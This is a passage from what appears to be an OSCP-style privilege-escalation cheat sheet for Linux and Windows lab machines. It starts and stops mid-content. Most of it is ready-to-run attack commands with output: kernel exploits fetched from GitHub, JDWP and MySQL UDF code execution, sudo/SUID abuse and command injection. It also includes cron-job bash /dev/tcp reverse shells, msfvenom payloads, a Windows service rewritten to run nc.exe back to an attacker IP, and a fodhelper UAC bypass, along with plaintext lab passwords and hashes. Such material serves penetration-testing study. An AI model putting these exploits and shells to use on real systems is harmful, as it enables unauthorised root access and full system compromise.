127.0.0.1:8000/backend/?view=../../../../../var/crash/test.php&cmd=id
````
### processes
#### JDWP
````
root         852  0.0  3.9 2536668 80252 ?       Ssl  May16   0:04 java -Xdebug Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
````
````
dev@example:/opt/stats$ cat App.java
cat App.java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

class StatsApp {
    public static void main(String[] args) {
        System.out.println("System Stats\n");
        Runtime rt = Runtime.getRuntime();
        String output = new String();

        try {
            ServerSocket echod = new ServerSocket(5000);
            while (true) {
              output = "";
              output += "Available Processors: " + rt.availableProcessors() +"\r\n";
              output += "Free Memory: " + rt.freeMemory() + "\r\n";
              output += "Total Memory: " + rt.totalMemory() +"\r\n";

              Socket socket = echod.accept();
              InputStream in = socket.getInputStream();
              OutputStream out = socket.getOutputStream();
              out.write((output + "\r\n").getBytes());
              System.out.println(output);
            }
        } catch (IOException e) {
            System.err.println(e.toString());
            System.exit(1);
        }
    }
}

````

````
https://github.com/IOActive/jdwp-shellifier
````

````
proxychains python2 jdwp-shellifier.py -t 127.0.0.1
nc -nv 192.168.234.150 5000 #this port runs on the app.java, do this to trigger it
````
##### RCE
````
proxychains python2 jdwp-shellifier.py -t 127.0.0.1 --cmd "busybox nc 192.168.45.191 80 -e sh"
nc -nv 192.168.234.150 5000 #to trigger alert
nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.234.150] 59382
id
uid=0(root) gid=0(root)
````
### Kernel Expoits
#### CVE-2022-0847
````
git clone https://github.com/Al1ex/CVE-2022-0847.git
cd CVE-2022-0847
python3 -m http.server 80
````
````
wget http://192.168.45.191:80/exp
chmod +x exp
cp /etc/passwd /tmp/passwd.bak
USERZ@example:~$ ./exp /etc/passwd 1 ootz:
It worked!
USERZ@example:~$ su rootz
rootz@example:/home/USERZ# whoami
rootz
rootz@example:/home/USERZ# id
uid=0(rootz) gid=0(root) groups=0(root)
````
#### CVE-2021-3156
````
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
chmod +x exploit_nss.py

userE@example01:~$ id
uid=1004(userE) gid=1004(userE) groups=1004(userE),998(apache)


userE@example01:~$ python3 exploit_nss.py 
# whoami
root
````
#### CVE-2022-2588
````
git clone https://github.com/Markakd/CVE-2022-2588.git
wget http://192.168.119.140/exp_file_credential
chmod +x exp_file_credential
./exp_file_credential
su user
Password: user
id
uid=0(user) gid=0(root) groups=0(root)
````
#### CVE-2016-5195
````
https://github.com/firefart/dirtycow
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
uname -a
Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
locate cc1
export PATH=$PATH:/usr/lib/gcc/i486-linux-gnu/4.7/cc1
./dirty
su firefart
````
#### CVE-2009-2698
````
uname -a
Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux
bash-3.00$ id 
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ ./exp
./exp
sh-3.00# id
id
uid=0(root) gid=0(root) groups=48(apache)
````
````
https://github.com/MrG3tty/Linux-2.6.9-Kernel-Exploit
````
#### CVE-2021-4034
````
uname -a
Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
````
````
https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit #local
chmod +x PwnKit #local
./PwnKit #Victim Machine
````
#### CVE-2021-4034
````
wget https://raw.githubusercontent.com/jamesammond/CVE-2021-4034/main/CVE-2021-4034.py
````
#### [CVE-2012-0056] memodipper
````
wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/memodipper/memodipper.c
gcc memodipper.c -o memodipper #compile on the target not kali
````
### NFS Shares
#### cat /etc/exports
##### no_root_squash
````
Files created via NFS inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.

Notice that the /srv share has root squashing disabled. Because of this, on our local machine we can create a mount point and mount the /srv share.

-bash-4.2$ cat /etc/exports
/srv/Share 10.1.1.0/24(insecure,rw)
/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)

"no_root_squash"
````
##### Setup
````
sshuttle -r sea@10.11.1.251 10.1.1.0/24 #setup
ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N #tunnel for 127.0.0.1 /srv/Share
mkdir /mnt/tmp
scp userc@10.1.1.27:/bin/bash . #copy over a reliable version of bash from the victim
chown root:root bash; chmod +s bash #change ownership and set sticky bit
ssh userc@10.1.1.27 #login to victim computer
````
##### Exploit
````
cd /srv/Share
ls -la #check for sticky bit
./bash -p #how to execute with stick bit
whoami
````
### Bad File permissions
#### cat /etc/shadow
````
root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
pcap:!!:15422:0:99999:7:::
````
### MySQL Enumeration
#### Linpeas
````
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                              
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*                                                                                                                                                                       
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*    
````
````
╔══════════╣ Analyzing Backup Manager Files (limit 70)
                                                                                                                                                                                                                                           
-rw-r--r-- 1 www-data www-data 3896 Mar 31 07:56 /var/www/html/management/application/config/database.php
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
        'password' => '@jCma4s8ZM<?kA',
        'database' => 'school_mgment',

````
#### MySQL login
````
<cation/config$ mysql -u 'school' -p 'school_mgment'         
Enter password: @jCma4s8ZM<?kA
````
````
mysql> show databases;
mysql> show tables;
````
````
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| school_mgment      |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
````
````
mysql> select * from teacher\G

select * from teacher\G
*************************** 1. row ***************************
     teacher_id: 1
           name: Testing Teacher
           role: 1
 teacher_number: f82e5cc
       birthday: 2018-08-19
            sex: male
       religion: Christianity
    blood_group: B+
        address: 546787, Kertz shopping complext, Silicon Valley, United State of America, New York city.
          phone: +912345667
          email: michael_sander@school.pg
       facebook: facebook
        twitter: twitter
     googleplus: googleplus
       linkedin: linkedin
  qualification: PhD
 marital_status: Married
      file_name: profile.png
       password: 3db12170ff3e811db10a76eadd9e9986e3c1a5b7
  department_id: 2
 designation_id: 4
date_of_joining: 2019-09-15
 joining_salary: 5000
         status: 1
date_of_leaving: 2019-09-18
        bank_id: 3
   login_status: 0
1 row in set (0.00 sec)
````
### MySQL User Defined Functions
````
port 0.0.0.0:3306 open internally
users with console mysql/bin/bash
MySQL connection using root/NOPASS Yes
````
````
your $IP>wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
victim>gcc -g -c raptor_udf2.c
victim>gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
victim>mysql -u root -p
````
````
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/j0hn/script/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function | 
+-----------+-----+----------------+----------+
````
````
your $IP> cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
nc -nvlp 443
mysql> select do_system('wget http://192.168.119.184/shell.php -O /tmp/shell.php;php /tmp/shell.php');
sh-3.2# id
uid=0(root) gid=0(root)
````
### sudo -l / SUID Binaries
#### (ALL) NOPASSWD: ALL
````
sudo su -
root@example01:~# whoami
root
````
#### (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
````
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
````
#### (ALL) NOPASSWD: /usr/bin/borg [comnmand] *
````
(ALL) NOPASSWD: /usr/bin/borg list *
(ALL) NOPASSWD: /usr/bin/borg mount *
(ALL) NOPASSWD: /usr/bin/borg extract *
````
##### Writable directory
````
find -name / "*borg*"
````
````
/opt/borgbackup
````
##### finding creds to login
````
./pspy64 -pf -i 1000
````
````
BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA'
````
##### Exploitation
````
sarah@backup:/opt$ sudo /usr/bin/borg list *
````
````
(name of archive) (data & time) (hash of archive)
````
````
sarah@backup:/opt$ sudo /usr/bin/borg extract borgbackup::home
````
````
sudo /usr/bin/borg extract [folder that is writable]::[name of archive]
````
````
sarah@backup:/opt$ sudo /usr/bin/borg extract --stdout borgbackup::home
````
````
mesg n 2> /dev/null || true
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
````
#### (ALL : ALL) /usr/sbin/openvpn
````
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
# id
uid=0(root) gid=0(root) groups=0(root)
````
#### (root) NOPASSWD: /usr/bin/nmap
````
bash-3.2$ id     
id
uid=100(asterisk) gid=101(asterisk)
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
````
####  /usr/local/bin/log_reader
````
observer@prostore:~$ /usr/local/bin/log_reader 
/usr/local/bin/log_reader 
Usage: /usr/local/bin/log_reader filename.log
````
````
observer@prostore:~$ /usr/local/bin/log_reader /var/log/auth.log
/usr/local/bin/log_reader /var/log/auth.log
Reading: /var/log/auth.log
May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
````
##### Exploit
````
observer@prostore:~$ /usr/local/bin/log_reader "/var/log/auth.log;chmod u+s /bin/bash"
</log_reader "/var/log/auth.log;chmod u+s /bin/bash"
Reading: /var/log/auth.log;chmod u+s /bin/bash
May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
````
````
observer@prostore:~$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
````
````
bash-5.1$ /bin/bash -p
/bin/bash -p
bash-5.1# id
id
uid=1000(observer) gid=1000(observer) euid=0(root) groups=1000(observer)
bash-5.1# cd /root
cd /root
bash-5.1# cat proof.txt
cat proof.txt
3a7df0bf25481b398003f325d6250ba7
````
#### /usr/bin/find
````
find . -exec /bin/sh -p \; -quit
````
````
# id
id
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
````
#### /usr/bin/dosbox
````
DOSBox version 0.74-3
````
````
export LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo Sarge ALL=(root) NOPASSWD: ALL >>c:$LFILE"

DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG:Loading primary settings from config file /home/Sarge/.dosbox/dosbox-0.74-3.conf
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
SHELL:Redirect output to c:/etc/sudoers

````

````
[Sarge@example ~]$ sudo -l
Runas and Command-specific defaults for Sarge:
    Defaults!/etc/ctdb/statd-callout !requiretty

User Sarge may run the following commands on example:
    (root) NOPASSWD: ALL
````

````
[Sarge@example ~]$ sudo su
[root@example Sarge]# whoami
root
````
#### /usr/bin/cp
````
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
cat /etc/passwd #copy the contents of this file your kali machine
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin

openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
echo 'hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passwd

cat passwd 
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
python3 -m http.server #Host the new passwd file
curl http://192.168.119.168/passwd -o passwd #Victim Machine
cp passwd /etc/passwd #This is where the attack is executed

bash-4.2$ su hacker
su hacker
Password: pass123

[root@pain tmp]# id
id
uid=0(root) gid=0(root) groups=0(root)
````
#### /usr/bin/screen-4.5.0
````
https://www.youtube.com/watch?v=RP4hAC96VxQ
````
````
https://www.exploit-db.com/exploits/41154
````
````
uname -a
Linux example 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
````
##### Setup
````
kali㉿kali)-[/opt/XenSpawn]
└─$ sudo systemd-nspawn -M Machine1
````
````
cd /var/lib/machines/Machine1/root
````
````
vim libhax.c
cat libhax.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
````
````
vim rootshell.c
cat rootshell.c 
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
````
````
root@Machine1:~# ls
libhax.c  rootshell.c
root@Machine1:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
root@Machine1:~# gcc -o rootshell rootshell.c
````
##### Attack
````
cd /tmp
userG@example:/tmp$ wget http://192.168.45.208:80/rootshell
userG@example:/tmp$ wget http://192.168.45.208:80/libhax.so
chmod +x rootshell
chmod +x libhax.so
````
````
userG@example:/$ /tmp/rootshell
/tmp/rootshell
$ id
id
uid=1000(userG) gid=1000(userG) groups=1000(userG)

userG@example:/$ cd /etc
userG@example:/etc$ umask 000
userG@example:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
userG@example:/etc$ ls -l ld.so.preload
userG@example:/etc$ screen-4.5.0 -ls

userG@example:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root)
````
### cat /etc/crontab
#### bash file
````
useradm@mailman:~/scripts$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /home/useradm/scripts/cleanup.sh > /dev/null 2>&1

echo " " > cleanup.sh
echo '#!/bin/bash' > cleanup.sh
echo 'bash -i >& /dev/tcp/192.168.119.168/636 0>&1' >> cleanup.sh
nc -nlvp 636 #wait 5 minutes
````
#### /usr/local/bin

![image](https://github.com/xsudoxx/OSCP/assets/127046919/f48d14b8-897f-4542-b244-53c90d04531f)

````
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
````

````
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=<$your IP> LPORT=21 #Transfer over to /tmp/shell
````
````
chloe@roquefort:/$ cp /tmp/shell /usr/local/bin/run-parts
cp /tmp/shell /usr/local/bin/run-parts
````

````
nc -nlvp 21
listening on [any] 21 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.67] 41624
id
uid=0(root) gid=0(root) groups=0(root)
````
#### base64key
![image](https://github.com/xsudoxx/OSCP/assets/127046919/719d4be5-ae0b-45d0-858a-22d2bd5a7ab8)

````
[marcus@catto ~]$ ls -la
total 24
drwx------  6 marcus marcus 201 May 28 22:20 .
drwxr-xr-x. 3 root   root    20 Nov 25  2020 ..
-rw-r--r--  1 root   root    29 Nov 25  2020 .bash
-rw-------  1 marcus marcus   0 Apr 14  2021 .bash_history
-rw-r--r--  1 marcus marcus  18 Nov  8  2019 .bash_logout
-rw-r--r--  1 marcus marcus 141 Nov  8  2019 .bash_profile
-rw-r--r--  1 marcus marcus 312 Nov  8  2019 .bashrc
-rwxrwxr-x  1 marcus marcus 194 May 28 22:18 boot_success
drwx------  4 marcus marcus  39 Nov 25  2020 .config
drwxr-xr-x  6 marcus marcus 328 Nov 25  2020 gatsby-blog-starter
drwx------  3 marcus marcus  69 May 28 22:06 .gnupg
-rw-------  1 marcus marcus  33 May 28 21:49 local.txt
drwxrwxr-x  4 marcus marcus  69 Nov 25  2020 .npm

````
````
[marcus@catto ~]$ cat .bash
F2jJDWaNin8pdk93RLzkdOTr60==
````
````
[marcus@catto ~]$ base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
SortMentionLeast269
````
````
[marcus@catto ~]$ su
Password: 
[root@catto marcus]# id
uid=0(root) gid=0(root) groups=0(root)
````

## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md #Last Resort
````
### Scheduled Tasks
#### Enumeration
````
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
````
#### ICACLS
````
C:\Backup>icacls TFTP.EXE
icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Admins:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)
````
````
BUILTIN\Users: The built-in "Users" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
BUILTIN\Admins: The built-in "Admins" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
NT AUTHORITY\SYSTEM: The "SYSTEM" account has "Full Control" (F) and "Inherit" (I) permissions on the file.
NT AUTHORITY\Authenticated Users: Authenticated users have "Modify" (M) and "Inherit" (I) permissions on the file.
````
#### Exploitation
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=80 -f exe -o TFTP.EXE #Replace the original file and wait for a shell
````
### Registry Keys
````
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
````
#### Putty
````
PS C:\Windows\System32> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
    zachary    REG_SZ    "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
````
### Windows Service - Insecure Service Permissions
#### Windows XP SP0/SP1 Privilege Escalation
````
C:\>systeminfo
systeminfo

Host Name:                 USERB
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 1 Build 2600
````
````
https://sohvaxus.github.io/content/winxp-sp1-privesc.html
unzip Accesschk.zip
ftp> binary
200 Type set to I.
ftp> put accesschk.exe
local: accesschk.exe remote: accesschk.exe
````
##### Download and older version accesschk.exe
````
https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip
````
##### Enumeration
````
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

accesschk.exe /accepteula -ucqv upnphost #command
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Admins
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS
        
sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : NT AUTHORITY\LocalService
        
 sc query SSDPSRV #command

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        STATE              : 1  STOPPED 
                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 1077       (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

sc config SSDPSRV start= auto #command
[SC] ChangeServiceConfig SUCCESS
````
##### Attack setup
````
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe" #command
[SC] ChangeServiceConfig SUCCESS

sc config upnphost obj= ".\LocalSystem" password= "" #command
[SC] ChangeServiceConfig SUCCESS

sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem

nc -nlvp 443 #on your kali machine

net start upnphost #Last command to get shell
````
##### Persistance
Sometime our shell can die quick, try to connect right away with nc.exe binary to another nc -nlvp listner
````
nc -nlvp 80

C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe #command
(UNKNOWN) [192.168.119.140] 80 (?) open
````
### User Account Control (UAC) Bypass
UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
allows an Admin user to bypass UAC by silently elevating our integrity level from medium
to high. As we will soon demonstrate, the fodhelper.exe509 binary runs as high integrity on Windows 10
1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the
Windows Registry. More specifically, it interacts with registry keys that can be modified without
administrative privileges. We will attempt to find and modify these registry keys in order to run a
command of our choosing with high integrity. Its important to check the system arch of your reverse shell.
````
whoami /groups #check your integrity level/to get high integrity level to be able to run mimikatz and grab those hashes  
````
````
C:\Windows\System32\fodhelper.exe #32 bit
C:\Windows\SysNative\fodhelper.exe #64 bit
````
#### Powershell
Launch Powershell and run the following
````
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force
````
run fodhelper setup and nc shell and check your priority
````
C:\Windows\System32\fodhelper.exe
````
#### cmd.exe
##### Enumeration
````
whoami /groups
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
````
##### Exploitation
````
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ #victim machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe #on your kali
certutil -urlcache -split -f http://192.168.119.140:80/shell.exe C:\Windows\Tasks\backup.exe #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Tasks\backup.exe" /f #victim machine
nc -nlvp 80 #on your kali
C:\Windows\system32>fodhelper.exe #victim machine
````
##### Final Product
````
whoami /groups
Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
````
### Scripts being run by Admin
````
typically this exploit will require manual enumeration. I was able to find a directory called C:\backup\Scripts\<vulnerable script>
````
````
C:\backup\Scripts>dir /q
dir /q
 Volume in drive C has no label.
 Volume Serial Number is 7C9E-C9E6

 Directory of C:\backup\Scripts

04/15/2023  07:20 PM    <DIR>          JAMES\jess            .
04/15/2023  07:20 PM    <DIR>          JAMES\jess            ..
04/15/2023  07:20 PM                 0 JAMES\jess            '
04/15/2023  07:29 PM               782 BUILTIN\Admins backup_perl.pl
05/02/2019  05:34 AM               229 BUILTIN\Admins backup_powershell.ps1
05/02/2019  05:31 AM               394 BUILTIN\Admins backup_python.py
               4 File(s)          1,405 bytes
               2 Dir(s)   4,792,877,056 bytes free
````
````
type backup_perl.pl
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Print the current user
system('whoami');

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
#### Testing for exploit
````
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Get the current user
my $user = `whoami`;
chomp $user;

# Print the current user to the console
print "Current user: $user\n";

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
$log .= "Current user: $user\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
##### Results
````
Current user: jess\Admin
Backup performed using Python at : 2023-04-15T19:28:41.597000
Backup performed using Python at : 2023-04-15T19:31:41.606000
Backup performed using Python at : 2023-04-15T19:34:41.661000
````
#### Exploit
````
use the msfvenom shell you used to get initial access to elevate privs with this script
````
````
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Get the current user
my $user = `whoami`;
chomp $user;

# Print the current user to the console
print "Current user: $user\n";

